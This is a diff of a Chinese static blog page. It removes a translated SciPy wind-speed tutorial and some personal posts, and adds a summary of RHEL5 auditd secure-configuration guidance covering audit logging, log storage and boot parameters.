-<pre><code>In [<span class="number">1</span>]: import numpy as np
-
-In [<span class="number">2</span>]: max_speeds = np.<span class="function"><span class="title">load</span><span class="params">(<span class="string">'max-speeds.npy'</span>)</span></span>
-
-In [<span class="number">3</span>]: years_nb = max_speeds<span class="class">.shape</span>[<span class="number">0</span>]
-</code></pre><p>从上一部分累积概率定义<code>p_i</code>，相应的值将是：</p>
-<pre><code>In [<span class="number">5</span>]: cprob = (np.arange(years_nb, dtype=np.float32) + <span class="number">1</span>) / (years_nb + <span class="number">1</span>)
-</code></pre><p>它们被假定用来拟合给定风速：</p>
-<h2 id="一元样条预测">一元样条预测</h2><p>本章中分位函数将通过使用<code>UnivariateSpline</code>类来估计，这个类可以代表源于数据点的样条。默认的行为是构建一个3级(degree)的样条，数据点可以根据它们的可靠性有不同的权重。变体有<code>InterpolateUnivariateSpline</code>和<code>LSQUnivariateSpline</code>，它们的误差检查将会改变。在需要二维样条的时候，<code>BivariateSpline</code>类一族被提供。所有这些一维和二维样条使用FITPACK Fortran子程序，这就是为何通过分别代表和估值样条的<code>splrep</code>和<code>splev</code>函数，一个低等的库存取可以使用。而且没有使用FITPACK参数的插值函数也被提供给更简单的使用(参见’interp1d’,<code>interp2d</code>,<code>barycentric_interpolate</code>等等)。</p>
-<p>对斯普罗最大风速，<code>UnivariateSpline</code>将被使用，因为3级的样条似乎拟合很正确：</p>
-<pre><code>In [<span class="number">7</span>]: from scipy<span class="class">.interpolate</span> import UnivariateSpline
-
-In [<span class="number">8</span>]: quantile_func =  <span class="function"><span class="title">UnivariateSpline</span><span class="params">(cprob,sorted_max_speeds)</span></span>
-</code></pre><p>分位函数想在将从整个概率范围求值：</p>
-<pre><code>In [<span class="number">9</span>]: nprob = np.<span class="function"><span class="title">linspace</span><span class="params">(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>e2)</span></span>
-
-In [<span class="number">10</span>]: fitted_max_speeds = <span class="function"><span class="title">quantile_func</span><span class="params">(nprob)</span></span>
-</code></pre><p>%2</p>
-<p>在目前的模型中，每五十年发生的最大风速被定义为上%2分位。结果，累积概率值将是：</p>
-<pre><code>In [<span class="number">11</span>]: fifty_prob = <span class="number">1.</span> - <span class="number">0.02</span>
-</code></pre><p>所以每五十年发生的暴风风速可被猜测，通过：</p>
-<pre><code>In [<span class="number">12</span>]: fifty_wind = <span class="function"><span class="title">quantile_func</span><span class="params">(fifty_prob)</span></span>
-
-In [<span class="number">13</span>]: fifty_wind
-Out[<span class="number">13</span>]: <span class="function"><span class="title">array</span><span class="params">(<span class="number">32.97989825386221</span>)</span></span>
-</code></pre><p>结果现在集中在一个Matplotlib图像上：</p>
-<p><img src="http://scipy-lectures.github.com/_images/plot_cumulative_wind_speed_prediction_1.png" alt="fifty-wind"></p>
-<p><a href="http://scipy-lectures.github.com/_downloads/plot_cumulative_wind_speed_prediction.py" target="_blank" rel="external">source code</a></p>
-<h2 id="Gumbell分布练习">Gumbell分布练习</h2><p>感兴趣的读者现在被邀请通过使用二十一年测量的风速来做个练习。这个测量周期是大约90分钟(原始周期大约10分钟，但是文件大小为了让练习更简单已经被减小)。数据以numpy格式存储在文件<a href="http://scipy-lectures.github.com/_downloads/sprog-windspeeds.npy" target="_blank" rel="external">sprog-windspeeds.npy</a>中。在你完成练习之前，不要看绘图源码。</p>
+              <p><a href="https://www.nsa.gov/ia/_files/os/redhat/rhel5-guide-i731.pdf" target="_blank" rel="external">Guide to the Secure Configuration of Red Hat Enterprise Linux 5</a>安全审计部分，章节2.6.2</p>
+<p>rhel提供了安全审计服务audit，默认情况下，该服务审计SELinux <a href="https://www.nsa.gov/research/_files/selinux/papers/slinux/node30.shtml" target="_blank" rel="external">AVC</a> denials和一些类型的安全事件。比如程序执行的系统登录、账户修改、和认证事件。</p>
+<p>默认情况下，auditd消耗的磁盘空间不影响系统性能。无论你的系统有没有开启SELinux支持，都建议开启auditd的默认配置。</p>
+<p>比如美国国防部常见的审计需求有：</p>
 <ul>
-<li>第一步将是使用numpy并绘制matplotlib条形图，找到每年最大值。</li>
+<li>确保审计确定的系统事件：<ul>
+<li>成功和不成功的使用打印机的命令</li>
+<li>成功或不成功的启动和关闭事件</li>
 </ul>
-<p><img src="http://scipy-lectures.github.com/_images/plot_sprog_annual_maxima_1.png" alt="bar"></p>
-<p><a href="http://scipy-lectures.github.com/_downloads/plot_sprog_annual_maxima.py" target="_blank" rel="external">source code</a></p>
+</li>
+<li>确保被审计软件可以被记录以下审计事件：<ul>
+<li>事件的日期和时间</li>
+<li>执行时间的用户id</li>
+<li>时间类型</li>
+<li>时间成功或失败</li>
+<li>标识和认证事件请求的来源(比如terminal ID)</li>
+<li>对向用户地址空间引入对象的事件，对对象删除操作、对象名称和<a href="http://en.wikipedia.org/wiki/Multilevel_security" target="_blank" rel="external">MLS系统</a>中对象的安全级别。</li>
+</ul>
+</li>
+<li>确保至少每周备份到另一个系统或媒介上</li>
+<li>确保旧日志被关闭，新的审计日志每天开始。</li>
+<li>确保配置不可更改。在audit.rule中<code>-e 2</code>设定更改审计规则需要重启。</li>
+<li>确保审计数据文件权限为<code>644</code>或者更严格。</li>
+</ul>
+<h2 id="开启auditd服务">开启auditd服务</h2><p>enable auditd服务：</p>
+<pre><code>chkconfig auditd <span class="function_start"><span class="keyword">on</span></span>
+</code></pre><p>默认情况下，auditd只记录SELinux denials，特定安全事件类型比如用户账户更改，登录事件和调用<code>sudo</code></p>
+<p>数据保存在<code>/var/log/audit/audit.log</code>。默认情况下<code>auditd</code>rotates 4个5MB日志，总共占据20MB空间。这样减小了系统压力，但可能丢失审计数据。</p>
+<h2 id="配置auditd数据存储">配置auditd数据存储</h2><ul>
+<li><p>确定当个日志文件的最大大小<code>STOREMB</code>(单位为mb)，增减或更改<code>/etc/audit/auditd.conf</code>的如下行：</p>
+<p>  max_log_file = STOREMB</p>
+</li>
+<li><p>对日志文件使用单独的分区或者逻辑卷。在安装时分区，要比auditd要用的稍微大点(大于<code>max_log_file x num_logs</code>)，确保审计分区挂载在<code>/var/log/audit</code></p>
+</li>
+<li><p>如果当审计无法执行时需要停机，配置auditd在磁盘空间不足时中止系统。编辑<code>/etc/audit/auditd.conf</code>，增加或修改如下行(磁盘空间不足给管理员发邮件)：</p>
+<p>  space_left_action = email<br>  action_mail_act = root<br>  admin_space_left_action= halt</p>
+</li>
+</ul>
+<p>默认的action是当日志达到单个日志的最大大小，循环日志，丢弃最老的。如果保留尽可能多的日志很重要，即使空间耗尽执行<code>admin_space_left_action</code>中定义行为，添加或修改如下行：</p>
+<pre><code>max_<span class="built_in">log</span>_file_action = keep_logs
+</code></pre><p>需要日志文件的大小和审计的事件类型密切相关。首先配置审计记录所有感兴趣的事件，人工监控一段时间日志大小去做决定。</p>
+<p>使用单独的分区<code>/var/log/audit</code>来阻止auditd日志耗尽磁盘空间影响系统功能，最重要的是，阻止其它/var中的程序填满审计日志空间。</p>
+<p>有些机器需要不做出action，如果是这样，直接设定成在耗尽磁盘空间时关机就行。</p>
+<p>注意：较老的日志会被循环丢弃！</p>
+<p>注意！！！！：如果系统配置为不能记录日志时停机，确定正常情况下不会发生这种事！确保<code>/var/log/audit</code>在单独的分区上，并且比auditd需要的保留数据的最大大小要大。</p>
+<h2 id="配置使先于audit守护进程启动的进程生效">配置使先于audit守护进程启动的进程生效</h2><p>为了确保先于audit进程启动的进程被审计，在<code>/etc/grub.conf</code>添加内核启动参数<code>audit=1</code>：</p>
+<pre><code>kernel <span class="regexp">/vmlinuz-version ro vga=ext root=/</span>dev<span class="regexp">/VolGroup00/</span>LogVol00 rhgb quiet audit=<span class="number">1</span>
+</code></pre><p>系统上每个进程都有个<code>auditable</code>标志标识它们是否能被审计。尽管auditd负责使所有它之后被启动的进程被审计，添加内核参数确保在启动时为每个进程设置参数。</p>
+<h2 id="配置全面的审计规则">配置全面的审计规则</h2><p>auditd能对系统活动实行全面的审计。这一部分描述了推荐的设置，更全面的请参照其它资源。<code>linux-audit@redhat.com</code>邮件列表是个好的信息来源。</p>
+<p>审计子系统支持大量事件类型，包括：</p>
 <ul>
-<li>第二步是使用Gumble分布——其累积概率<code>p_i</code>被定义为<code>-log(-log(p_i))</code>，来拟合一个线性分位函数(记住你可以定义<code>UnivariateSpline</code>的级数(degree))。绘制每年最大风速与Gumble分布应该给出以下图像：</li>
+<li>追踪任何进入或退出的系统调用(以名称或编号命名)。</li>
+<li>以PID，UID，调用成功与否，系统调用参数(有些限制)等等来过滤。</li>
+<li>监控特殊文件内容和元数据的更改。</li>
 </ul>
-<p><img src="http://scipy-lectures.github.com/_images/plot_gumbell_wind_speed_prediction_1.png" alt="http://scipy-lectures.github.com/_images/plot_gumbell_wind_speed_prediction_1.png"></p>
-<p><a href="http://scipy-lectures.github.com/_downloads/plot_gumbell_wind_speed_prediction.py" target="_blank" rel="external">source code</a></p>
-<ul>
-<li>最后一步是找到每五十年发生的最大风速34.23m/s</li>
-</ul>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/life/2015/11/15/2012-09-20/" itemprop="url">
-                  创新项目要结束了
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:30+08:00" content="2015-11-15">
-              2015-11-15
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/life/" itemprop="url" rel="index">
-                    <span itemprop="name">life</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/life/2015/11/15/2012-09-20/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/11/15/2012-09-20/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <h2 id="序">序</h2><p>最近室友在忙着写简历找工作(其实也没忙着，该dota还dota，该看电视剧的还是电视剧，总之貌似很闲，难道我大江大……)，我想很久怎么写自己简历了，可是愈发感觉自己碌碌无为，啥也不会。也从各路大牛网站看过好几份Resume或者CV来着，更加感到自己弱爆了，真应了fengya90之前说的，出去就是被秒的份。今天还看了同学的浙大同级同学简历，算了，我真是弱爆了。</p>
-<p>大概大多数人看来，我就是混了三年，保研什么都扯淡了，成绩垃圾得一塌糊，学术完全无力，工作兼职更是扯淡，也没担过当啥重任。不管从哪里看，大概都是彻头彻尾的loser。</p>
-<p>但不说了，目测创新项目要结题了。</p>
-<h2 id="创新项目之大坑">创新项目之大坑</h2><p>大学生创新项目逐渐变成了一个大坑……，如何从一个国家级项目沦落到校级项目又如何立项之后导师也被换了就不细说了。话说新导师不错啊，可是他中途接手别人的项目也很蛋疼……</p>
-<p>总之，五个人开始填这个大坑。嘛，这dota[^1]阵容，我怎么评价么。</p>
-<p>总之，我就是苦逼的技术支持。一出问题就被召唤……</p>
-<p>开始技术支持的时候我刚接触linux不久<a href="其实也两三个月了，大概我换archlinux单系统那段时间吧">^2</a>，实际上想做另一个偏计算机的项目，不过无所谓了，于是开始了这个NdFeB磁特性的项目。</p>
-<p>本来我没什么热情的，但竟然是在理学院数学实验室机房，做计算。关键是几台linux机器，嘛，真棒。我以前只在我的计算机上和化工学院研究生实验室看到过，没想到自己做的项目和linux有关。虽然是学校的机器上都是古老而难懂的RHEL5。<a href="我是相对与arch说的新旧……莫喷。">^3</a></p>
-<p>竟然还有幸使用学院十八万一年购入的NB软件——<a href="http://www.quantumwise.com/" target="_blank" rel="external">Atomistix ToolKit (ATK)</a>,顺便说下使用了一年，我只想说真尼玛感觉没开源软件好用，不过技术支持不错。</p>
-<p>紧接着，我们就发现这多大一个坑了：</p>
-<ul>
-<li>学长对计算机及软件一知半解，多靠学长的学长或学姐(没见到过)留下的笔记和口口相传来进行计算。但他们理论比我们好多了，帮助我们解决了一些问题。但还是有很多坑……</li>
-<li>老师中途接手项目，完全不熟悉这个软件，也不很熟悉这个项目</li>
-<li>我们接着换导师前的导师的研究生的项目继续往下做，直接使用前辈建好的模型再根据自己需要修改。可是这个模型太大了，几百个原子……计算机吃不消，经常内存都不够，有次半个月没算出来。</li>
-<li>一堆参数不知道怎么设定，发现前辈留下的log都是各种不收敛……</li>
-<li>有买来的atk的REHL那台机器上的atk/vnl经常出错，学院一堆机器经常有些莫名奇妙的问题</li>
-<li>有atk那台的机器卡爆了……</li>
-<li>各种因为不了解软件及原理本身的而造成的错误</li>
-<li>各种手误，还有不良的管理习惯，比如说新建的那一堆文件夹，结果我现在都不知道各个文件夹都放的什么东西了。</li>
-<li>软件自身问题，比如算法bug</li>
-</ul>
-<h2 id="但我学到了很多">但我学到了很多</h2><p>不像有的导师直接帮学生都发好文章了，我组的同学，特别那些要出国要考研要论文的同志们就苦逼了……</p>
-<p>像我这种苦逼考研党倒不在乎，可是作为技术支持永远也别想闲下来不管……</p>
-<p>我们的项目在各种坑中颠簸了一年现在还没出论文，从老师开始口口声声的发国外到先发JNU学报上，到某写论文的出国党主力dps差点放弃不搞。</p>
-<p>现在快结束了，跳过一个软件算法bug，希望明天算出来有个好结果。</p>
-<p>一年，我还是学到了很多哦，收获不浅。</p>
-<p>我学到的很多也用上了，这真让我惊奇，<strong>我从来没想过自己在折腾中学到的很多东西，竟然真的用上了。</strong></p>
-<ul>
-<li>将学院几台linux机器几乎和自己机器集成起来了。</li>
-<li>配置好ssh和vnc，在寝室我可以通过ssh，vnc很方便的查看计算进度，结果，和其它任何操作。</li>
-<li>利用dolphin的fish特性可视化ssh，这玩意太好用了。远端就像本地一样。</li>
-<li>打开了vnc服务教他们怎么用浏览器使用远程桌面，可是windows用户还是更习惯去实验室用windows……</li>
-<li>建立了ftp服务方便几台机器的文件共享。</li>
-<li>熟悉了怎么在linux下编译软件，怎么使用软件<a href="当然第一件是看文档看教程了，然后才是google搜索(baidu弱爆了)">^4</a>。编译配置mpich尝试集群并行计算，最后发现专有软件真尼玛坑，要集群还要付钱……</li>
-<li>在自己机器archlinux上装上了atk/vnl……然后半个月不到尼玛就过期不让用了……</li>
-<li>熟悉了vim各种高效操作，改各种文件改的真欢，连vimdiff都用上了……</li>
-<li>脚本化计算，让计算能够排队……</li>
-<li>完全习惯用终端或者从其它linux或windows机器上ssh上去用cli操作，因为内存被atk吃空的那台机器卡爆了</li>
-<li>最后因为atk/vnl什么莫名奇妙不能可视化图形的毛病，发现atkpython中已经集成了matplotlib和numpy，自己手动可视化。不过windows用户还是更习惯用Origin……</li>
-<li>正好学了点python，然后竟然在一些关键问题上比如win和linux在python中路径，序列切片的问题用上了。</li>
-<li>很多问题简直凭借常年在linux系统下的经验和直觉解决的。</li>
-<li>忽然想到有次帮别人制作presentation的图连gimp都用上了。不过当时对gimp比较熟悉，完全无压力。</li>
-</ul>
-<h2 id="创新项目对我的影响">创新项目对我的影响</h2><p>我想说，我没有打酱油，这就很满意了。事实上要是像有的同学创新项目一样都没做什么老师都帮忙发论文什么的我反而感觉可惜了，也很庆幸竟然做了这么个大坑项目。</p>
-<p>我还想说，我努力不让别人失望，希望我做到了。</p>
-<p>因为<a href="http://www.quantumwise.com/" target="_blank" rel="external">Atomistix ToolKit (ATK)</a>这个大坑，还有其它一些莫名奇妙的原因我变成pythoner了，而且将来想用python作为工具从事数据挖掘和机器学习的工作。</p>
-<p>更加熟悉了linux系统，竟然还把某台上的REHL偷天换日更新成CentOS了，vim和各种终端操作更加熟练。</p>
-<p>ssh/vnc配置使用自不必说。</p>
-<p><a href="http://www.quantumwise.com/" target="_blank" rel="external">Atomistix ToolKit (ATK)</a>基于某python的DFT(密度泛函理论)实现反过来促进了我对物理的兴趣，我本身是学物理的嘛，不过貌似被大学教育把兴趣几乎抹杀了。</p>
-<p>还有其它一些关于团队和做事的思考，不写。</p>
-<hr>
-<h2 id="一些纪念截图">一些纪念截图</h2><p>在archlinux装的atk/vnl</p>
-<p><img src="http://fmn.rrimg.com/fmn065/20120306/1650/p_large_kKj5_1476000000551260.jpg" alt="在archlinux装的atk/vnl"></p>
-<p>经常内存就这么满了</p>
-<p><img src="http://fmn.rrfmn.com/fmn058/20120625/1850/p_large_l0Vh_0cab00011abb1261.jpg" alt="经常内存就这么满了"></p>
-<p>我用python画出来的自旋平行态密度,和下图一样因算法问题算得根本就不对……</p>
-<p><img src="http://fmn.rrimg.com/fmn057/20120919/2245/p_large_C5Mt_608a00001d3b1262.jpg" alt="我用python画出来的自旋平行态密度"></p>
-<p>我用python画出来的自旋反平行态密度</p>
-<p><img src="http://fmn.rrimg.com/fmn056/20120919/2245/p_large_b12B_608a00001d3c1262.jpg" alt="我用python画出来的自旋反平行态密度"></p>
-<p>我们的模型,我用gimp处理的，还有个彩版的。</p>
-<p><img src="http://fmn.rrimg.com/fmn061/20120921/0725/p_large_BcP2_109300000ba71262.jpg" alt="模型"></p>
-<h2 id="鸣谢">鸣谢</h2><p>感谢指导老师的支持，各位组员的共同努力，特别感谢某出国党的坚持，希望明天有个不错的结果，最后写论文什么就没我什么事了<a href="要是用latex或者markdown写我会不会抢着写……">^5</a>。</p>
-<hr>
-<p>2012年09月21日 星期五 18时23分32秒</p>
-<p>还好，大家争取两天把论文写完。</p>
-<hr>
-<h2 id="FootNotes">FootNotes</h2><p>[^1]:I hate Dota</p>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/python/2015/11/15/2012-09-12/" itemprop="url">
-                  科学计算工具和工作流
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:30+08:00" content="2015-11-15">
-              2015-11-15
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/python/2015/11/15/2012-09-12/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/11/15/2012-09-12/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <h1 id="Scientific_computing_with_tools_and_workflow">Scientific computing with tools and workflow</h1><hr>
-<p><strong>好长的标题……</strong></p>
-<p>从<a href="http://scipy-lectures.github.com/intro/intro.html" target="_blank" rel="external">scipy lecture notes</a>引言翻译。这是篇python 做科学计算的水文……</p>
-<p>作者:Fernando Perez, Emmanuelle Gouillart, Gaël Varoquaux。感谢他们贡献了如此棒的教材。</p>
-<hr>
-<p><strong>目录</strong></p>
-<ul>
-<li>toc<br>{: toc}</li>
-</ul>
-<h2 id="为什么Python？">为什么Python？</h2><h3 id="科学家的需求">科学家的需求</h3><ul>
-<li>获取数据(模拟，试验操控)</li>
-<li>操作和处理数据</li>
-<li>可视化结果……让我们理解我们在做什么！</li>
-<li>交流结果：产生用来做报告或出版的图像，写演示文稿。</li>
-</ul>
-<h3 id="要求">要求</h3><ul>
-<li>对相应经典数值方法和基本作用已经存在丰富的程序块：我们不想再次为绘制曲线、傅利叶变换或者拟合算法重新编程。不要重复发明轮子。</li>
-<li>简单易学：计算机科学不是我们的课程也不是工作。我们想要在几分钟内绘制曲线、平滑信号和做傅利叶变换。</li>
-<li>易于和合作者、学生、顾客交流，让代码在试验室或公司内部都生动起来：代码应该像本书一样易读。因此，语言应该包含尽量少的语法符号或不必要的规范，使数学家和科学家读者能够理解代码。</li>
-<li>有效率地编码和快速执行……但是不必说如果我们花太多时间来编写它，非常快的代码也变得无用。所以，我们需要同样短的开发时间和短的执行时间。</li>
-<li>一个单独的环境/语言解决所有事情。如果可能，避免为每个新问题学习新的软件。</li>
-</ul>
-<h3 id="已经存在的解决方案">已经存在的解决方案</h3><p>科学家们用什么工作？</p>
-<p><em>编译语言：C,C++,Fortran等等</em></p>
-<ul>
-<li>优点：<ul>
-<li>非常快。高度优化的编译器。对大量计算，很难超越这些语言。</li>
-<li>为这些语言已经写了一些高度优化的科学库。例如：BLAS(向量/矩阵运算库)</li>
-</ul>
-</li>
-<li>缺点：<ul>
-<li>难用：在开发时没有交互，命令式的编译步骤，累赘的语法(<code>&amp;, ::, }}, ;</code>等等)，人工内存管理(C中很棘手)。这些对非计算机科学家是<em>难懂的语言</em>。</li>
-</ul>
-</li>
-</ul>
-<p><em>脚本语言：Matlab</em></p>
-<ul>
-<li>优点：<ul>
-<li>在许多领域有丰富的数值算法库。因为这些库经常用编译语言写成而有快的执行速度。</li>
-<li>友好的开发环境：全面而且组织良好的帮助，集成的编辑器等。</li>
-<li>商业支持</li>
-</ul>
-</li>
-<li>缺点：<ul>
-<li>基本语言太弱了，高级用户将很受限。</li>
-<li>不免费</li>
-</ul>
-</li>
-</ul>
-<p><em>其它脚本语言：Scilab, Octave, Igor, R, IDL等等</em></p>
-<ul>
-<li>优点：<ul>
-<li>开源、免费,或者至少比Matlab便宜。</li>
-<li>有些功能非常高级(R中的统计，Igor中的绘图等等)</li>
-</ul>
-</li>
-<li>缺点：<ul>
-<li>比Matlab中可用算法少，语言不高级。</li>
-<li>有些软件专注于一个领域。例如:Gnuplot或xmgrace绘制曲线。这些程序非常强大，但是它们被限制在一种类型的使用上，例如绘图。</li>
-</ul>
-</li>
-</ul>
-<p><em>Python怎么样</em></p>
-<ul>
-<li>优点：<ul>
-<li>非常丰富的科学计算库(尽管稍微比Matlab少那么一点点)</li>
-<li>很好的思考语言，允许写出非常易读和组织很好的代码：“所码即所想” 。</li>
-<li>相当之多科学计算任务之外的库(网络服务器管理、串口访问等等。)</li>
-<li>自由免费和开源，使用广泛，活跃的社区。</li>
-</ul>
-</li>
-<li>缺点：<ul>
-<li>不怎么友好的开发环境和某些软件相比，比如Matlab。(更加geek向一些)。</li>
-<li>并非所有的算法可以在专业软件和工具箱中找到。</li>
-</ul>
-</li>
-</ul>
-<h2 id="python科学工具">python科学工具</h2><p>不像Matlab，Scilab和R，Python并不预先绑定一套科学计算模块。以下是用来搭建科学计算环境的基本构建模块：</p>
-<ul>
-<li><p><em>Python</em>，一个通用和现代的计算语言</p>
-<ul>
-<li>Python语言：数据结构(字符串、整型)，控制流，数据集合(列表、字典)，模式等等。</li>
-<li>标准库的模块</li>
-<li>大量用Python写成特殊用途的模块或应用：网络协议，网络框架等等，还有科学计算。</li>
-<li>开发工具(自动测试，文档生成)</li>
-</ul>
-</li>
-<li><p><em>IPython</em>，一个高级<em>Python shell</em> <a href="http://ipython.scipy.org/moin/" target="_blank" rel="external">http://ipython.scipy.org/moin/</a></p>
-</li>
-<li><p><em>Numpy</em>，提供强大的数值数组对象和操作它们的程序。<a href="http://www.numpy.org/" target="_blank" rel="external">http://www.numpy.org/</a></p>
-</li>
-<li><p><em>Scipy</em>：高水准的数据处理程序。优化、回归、插值等等。<a href="http://www.scipy.org/" target="_blank" rel="external">http://www.scipy.org/</a></p>
-</li>
-<li><p><em>Matplotlib</em>：二维可视化，“出版水准”的绘图。<a href="http://matplotlib.sourceforge.net/" target="_blank" rel="external">http://matplotlib.sourceforge.net/</a></p>
-</li>
-<li><p><em>Mayavi</em>：三维可视化。<a href="http://code.enthought.com/projects/mayavi/" target="_blank" rel="external">http://code.enthought.com/projects/mayavi/</a></p>
-</li>
-</ul>
-<h2 id="交互工作流:IPython和文本编辑器">交互工作流:IPython和文本编辑器</h2><p><strong>交互工作来测试和理解算法</strong>：在这一部分，我们描述一个使用<a href="http://ipython.org/" target="_blank" rel="external">IPython</a>交互工作流，这很方便探索和理解算法。</p>
-<p>Python是一种通用语言。因此，没有一个得天独厚的工作环境,使用它的方式不只一种。尽管这让初学者很难找到自己的路，但让Python可能被用来在服务器上或嵌入设备上写程序。</p>
-<blockquote>
-<p><strong>注解</strong>：这部分的参考文档：</p>
-<p><strong>IPython用户手册</strong>：<a href="http://ipython.org/ipython-doc/dev/index.html" target="_blank" rel="external">http://ipython.org/ipython-doc/dev/index.html</a></p>
-</blockquote>
-<h3 id="命令行交互">命令行交互</h3><p>启动<em>ipython</em>：</p>
-<pre><code>In [<span class="number">1</span>]: <span class="function"><span class="title">print</span><span class="params">(<span class="string">'Hello world'</span>)</span></span>
-Hello world
-</code></pre><p>获得帮助<a href="在python2.7以后不会这样显示了。">^1</a>：</p>
-<pre><code>In [<span class="number">2</span>]: print?
-Type:               builtin_function_or_method
-Base Class:         &lt;type <span class="string">'builtin_function_or_method'</span>&gt;
-String Form:        &lt;built-<span class="operator">in</span> <span class="function"><span class="keyword">function</span> <span class="title">print</span>&gt;</span>
-Namespace:          Python builtin
-Docstring:
-    print(<span class="built_in">value</span>, ..., sep=<span class="string">' '</span>, <span class="keyword">end</span>=<span class="string">'\n'</span>, <span class="built_in">file</span>=sys.<span class="keyword">stdout</span>)
-
-    Prints <span class="operator">the</span> values <span class="built_in">to</span> <span class="operator">a</span> stream, <span class="operator">or</span> <span class="built_in">to</span> sys.<span class="keyword">stdout</span> <span class="keyword">by</span> default.
-    Optional keyword arguments:
-    <span class="built_in">file</span>: <span class="operator">a</span> <span class="built_in">file</span>-like object (stream); defaults <span class="built_in">to</span> <span class="operator">the</span> current sys.<span class="keyword">stdout</span>.
-    sep:  <span class="keyword">string</span> inserted between values, default <span class="operator">a</span> <span class="constant">space</span>.
-    <span class="keyword">end</span>:  <span class="keyword">string</span> appended <span class="keyword">after</span> <span class="operator">the</span> <span class="keyword">last</span> <span class="built_in">value</span>, default <span class="operator">a</span> newline.
-</code></pre><h3 id="在编辑器中拟定算法">在编辑器中拟定算法</h3><p>在文本编辑器中创建一个文件<code>my_file.py</code>。在EPD(Enthought Python Distribution)<a href="Enthought公司配置好的一套环境，教育网邮箱可以免费申请使用。">^2</a>中，你可以使用从开始菜单使用<em>Scite</em>。在Python(x,y)中<a href="另一个配置好的环境。">^3</a>，你可以使用Spyder。在Ubuntu下，如果你还没有喜欢的编辑器，我们建议安装<em>Stani’s Python editor</em>。在这个文件中，添加以下行：</p>
-<pre><code>s = <span class="string">'Hello world'</span>
-<span class="function"><span class="title">print</span><span class="params">(s)</span></span>
-</code></pre><p>现在，你可以在IPython中运行和探索结果变量：</p>
-<pre><code><span class="keyword">In</span> [3]: %<span class="keyword">run</span> my_file.py
-Hello <span class="literal">word</span>
-
-<span class="keyword">In</span> [4]: <span class="literal">s</span>
-<span class="keyword">Out</span>[4]: 'Hello word'
-
-<span class="keyword">In</span> [5]: %whos
-Variable   <span class="keyword">Type</span>    Data/Info
-
-----------------------------
-s          str     Hello <span class="literal">word</span>
-</code></pre><blockquote>
-<p><strong>从脚本到函数</strong></p>
-<p> 虽然只用一个接一个指令的脚本工作很诱惑，但请逐渐将脚本改进成一套函数：</p>
-<ul>
-<li>一个脚本不可复用，但函数可以。</li>
-<li>以函数式思考益于将问题分解。</li>
-</ul>
-</blockquote>
-<hr>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/life/2015/11/15/2012-08-04/" itemprop="url">
-                  这只是篇随笔
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:30+08:00" content="2015-11-15">
-              2015-11-15
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/life/" itemprop="url" rel="index">
-                    <span itemprop="name">life</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/life/2015/11/15/2012-08-04/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2015/11/15/2012-08-04/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <h1 id="2012年08月04日随笔">2012年08月04日随笔</h1><p>其实是好久没在这写东西了。<code>^o^</code></p>
